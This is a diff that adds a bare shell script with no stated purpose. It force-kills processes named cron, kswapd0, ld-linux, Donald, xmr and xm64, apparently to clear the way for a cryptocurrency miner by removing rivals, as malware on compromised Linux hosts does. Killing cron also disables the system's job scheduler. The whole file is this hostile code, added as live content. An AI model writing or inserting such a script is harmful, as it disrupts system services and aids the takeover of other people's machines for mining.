@@ -1,0 +1,26 @@
+#!/bin/sh
+pkill -9 cron
+killall -9 cron
+kill -9 `ps x|grep cron|grep -v grep|awk '{print $1}'`>.proc
+
+pkill -9 kswapd0
+killall -9 kswapd0
+kill -9 `ps x|grep kswapd0|grep -v grep|awk '{print $1}'`>.proc
+
+
+pkill -9 ld-linux
+killall -9 ld-linux
+kill -9 `ps x|grep ld-linux|grep -v grep|awk '{print $1}'`>.proc
+
+pkill -9 Donald
+killall -9 Donald
+kill -9 `ps x|grep Donald|grep -v grep|awk '{print $1}'`>.proc
+
+pkill -9 xmr
+killall -9 xmr
+kill -9 `ps x|grep xmr|grep -v grep|awk '{print $1}'`>.proc
+
+pkill -9 xm64
+killall -9 xm64
+kill -9 `ps x|grep xm64|grep -v grep|awk '{print $1}'`>.proc
+rm -rf .proc
